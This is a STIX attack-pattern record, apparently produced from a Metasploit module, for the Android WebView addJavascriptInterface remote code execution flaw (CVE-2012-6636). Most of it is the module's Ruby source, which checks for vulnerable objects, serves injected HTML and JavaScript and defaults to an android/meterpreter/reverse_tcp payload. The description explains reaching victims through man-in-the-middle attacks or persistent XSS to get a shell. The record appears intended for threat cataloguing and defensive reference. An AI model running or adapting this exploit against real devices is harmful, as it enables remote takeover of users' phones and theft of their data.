{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3ac54173-31ef-4905-8e72-4e1dc86386e6",
    "created": "2024-08-14T16:35:03.875396Z",
    "modified": "2024-08-14T16:35:03.8754Z",
    "name": "Android Browser and WebView addJavascriptInterface Code Execution",
    "description": " This module exploits a privilege escalation issue in Android < 4.2's WebView component that arises when untrusted Javascript code is executed by a WebView that has one or more Interfaces added to it. The untrusted Javascript code can call into the Java Reflection APIs exposed by the Interface and execute arbitrary commands.  Some distributions of the Android Browser app have an addJavascriptInterface call tacked on, and thus are vulnerable to RCE. The Browser app in the Google APIs 4.1.2 release of Android is known to be vulnerable.  A secondary attack vector involves the WebViews embedded inside a large number of Android applications. Ad integrations are perhaps the worst offender here. If you can MITM the WebView's HTTP connection, or if you can get a persistent XSS into the page displayed in the WebView, then you can inject the html/js served by this module and get a shell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/browser/webview_addjavascriptinterface.rb",
            "external_id": "webview_addjavascriptinterface.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trustlook.com/2013/09/04/alert-android-webview-addjavascriptinterface-code-execution-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/"
        },
        {
            "source_name": "reference",
            "url": "http://50.56.33.56/blog/?p=314"
        },
        {
            "source_name": "reference",
            "url": "https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mwrlabs/drozer/blob/bcadf5c3fd08c4becf84ed34302a41d7b5e9db63/src/drozer/modules/exploit/mitm/addJavaScriptInterface.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::Remote::BrowserAutopwn\n  include Msf::Exploit::Android\n\n  VULN_CHECK_JS = %Q|\n    for (i in top) {\n      try {\n        top[i].getClass().forName('java.lang.Runtime');\n        is_vuln = true; break;\n      } catch(e) {}\n    }\n  |\n\n  autopwn_info(\n    :os_name    => OperatingSystems::Match::ANDROID,\n    :arch       => ARCH_ARMLE,\n    :javascript => true,\n    :rank       => ExcellentRanking,\n    :vuln_test  => VULN_CHECK_JS\n  )\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'Android Browser and WebView addJavascriptInterface Code Execution',\n      'Description'         => %q{\n            This module exploits a privilege escalation issue in Android < 4.2's WebView component\n          that arises when untrusted Javascript code is executed by a WebView that has one or more\n          Interfaces added to it. The untrusted Javascript code can call into the Java Reflection\n          APIs exposed by the Interface and execute arbitrary commands.\n\n          Some distributions of the Android Browser app have an addJavascriptInterface\n          call tacked on, and thus are vulnerable to RCE. The Browser app in the Google APIs\n          4.1.2 release of Android is known to be vulnerable.\n\n          A secondary attack vector involves the WebViews embedded inside a large number\n          of Android applications. Ad integrations are perhaps the worst offender here.\n          If you can MITM the WebView's HTTP connection, or if you can get a persistent XSS\n          into the page displayed in the WebView, then you can inject the html/js served\n          by this module and get a shell.\n\n          Note: Adding a .js to the URL will return plain javascript (no HTML markup).\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              => [\n        'jduck', # original msf module\n        'joev'   # static server\n      ],\n      'References'          => [\n        ['URL', 'http://blog.trustlook.com/2013/09/04/alert-android-webview-addjavascriptinterface-code-execution-vulnerability/'],\n        ['URL', 'https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/'],\n        ['URL', 'http://50.56.33.56/blog/?p=314'],\n        ['URL', 'https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/'],\n        ['URL', 'https://github.com/mwrlabs/drozer/blob/bcadf5c3fd08c4becf84ed34302a41d7b5e9db63/src/drozer/modules/exploit/mitm/addJavaScriptInterface.py'],\n        ['CVE', '2012-6636'], # original CVE for addJavascriptInterface\n        ['CVE', '2013-4710'], # native browser addJavascriptInterface (searchBoxJavaBridge_)\n        ['EDB', '31519'],\n        ['OSVDB', '97520']\n      ],\n      'Platform'            => ['android', 'linux'],\n      'Arch'                => [ARCH_DALVIK, ARCH_X86, ARCH_ARMLE, ARCH_MIPSLE],\n      'DefaultOptions'      => { 'PAYLOAD' => 'android/meterpreter/reverse_tcp' },\n      'Targets'             => [ [ 'Automatic', {} ] ],\n      'DisclosureDate'      => '2012-12-21',\n      'DefaultTarget'       => 0,\n      'BrowserRequirements' => {\n        :source     => 'script',\n        :os_name    => OperatingSystems::Match::ANDROID,\n        :vuln_test  => VULN_CHECK_JS,\n        :vuln_test_error => 'No vulnerable Java objects were found in this web context.'\n      }\n    ))\n\n    deregister_options('JsObfuscate')\n  end\n\n  # Hooked to prevent BrowserExploitServer from attempting to do JS detection\n  # on requests for the static javascript file\n  def on_request_uri(cli, req)\n    if req.uri =~ /\\.js/\n      serve_static_js(cli, req)\n    else\n      super\n    end\n  end\n\n  # The browser appears to be vulnerable, serve the exploit\n  def on_request_exploit(cli, req, browser)\n    arch = normalize_arch(browser[:arch])\n    print_status \"Serving #{arch} exploit...\"\n    send_response_html(cli, html(arch))\n  end\n\n  # Called when a client requests a .js route.\n  # This is handy for post-XSS.\n  def serve_static_js(cli, req)\n    arch          = req.qstring['arch']\n    response_opts = { 'Content-type' => 'text/javascript' }\n\n    if arch.present?\n      print_status(\"Serving javascript for arch #{normalize_arch arch}\")\n      send_response(cli, add_javascript_interface_exploit_js(normalize_arch arch), response_opts)\n    else\n      print_status(\"Serving arch detection javascript\")\n      send_response(cli, static_arch_detect_js, response_opts)\n    end\n  end\n\n  # This is served to requests for the static .js file.\n  # Because we have to use javascript to detect arch, we have 3 different\n  # versions of the static .js file (x86/mips/arm) to choose from. This\n  # small snippet of js detects the arch and requests the correct file.\n  def static_arch_detect_js\n    %Q|\n      var arches = {};\n      arches['#{ARCH_ARMLE}']  = /arm/i;\n      arches['#{ARCH_MIPSLE}'] = /mips/i;\n      arches['#{ARCH_X86}']    = /x86/i;\n\n      var arch = null;\n      for (var name in arches) {\n        if (navigator.platform.toString().match(arches[name])) {\n          arch = name;\n          break;\n        }\n      }\n\n      if (arch) {\n        // load the script with the correct arch\n        var script = document.createElement('script');\n        script.setAttribute('src', '#{get_uri}/#{Rex::Text::rand_text_alpha(5)}.js?arch='+arch);\n        script.setAttribute('type', 'text/javascript');\n\n        // ensure body is parsed and we won't be in an uninitialized state\n        setTimeout(function(){\n          var node = document.body \\|\\| document.head;\n          node.appendChild(script);\n        }, 100);\n      }\n    |\n  end\n\n  # @return [String] normalized client architecture\n  def normalize_arch(arch)\n    if SUPPORTED_ARCHES.include?(arch) then arch else DEFAULT_ARCH end\n  end\n\n  def html(arch)\n    \"<!doctype html><html><body><script>#{add_javascript_interface_exploit_js(arch)}</script></body></html>\"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-12-21",
    "x_mitre_platforms": [
        "['android', 'linux']"
    ]
}